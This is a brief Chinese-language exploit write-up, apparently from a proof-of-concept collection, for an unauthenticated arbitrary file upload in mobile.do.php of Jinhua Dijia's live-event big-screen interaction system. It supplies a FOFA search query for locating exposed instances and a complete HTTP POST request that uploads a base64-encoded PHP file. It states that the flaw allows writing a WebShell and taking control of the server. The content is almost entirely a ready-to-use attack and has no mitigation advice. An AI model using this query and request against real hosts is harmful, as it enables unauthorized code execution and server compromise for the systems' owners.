# 金华迪加现场大屏互动系统mobile.do.php任意文件上传漏洞

金华迪加 现场大屏互动系统 mobile.do.php 存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。

## fofa

```javascript
body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
```

## poc

```javascript
POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close

filetype=php&imgbase64=PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=
```

![image-20241101195240598](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411011952654.png)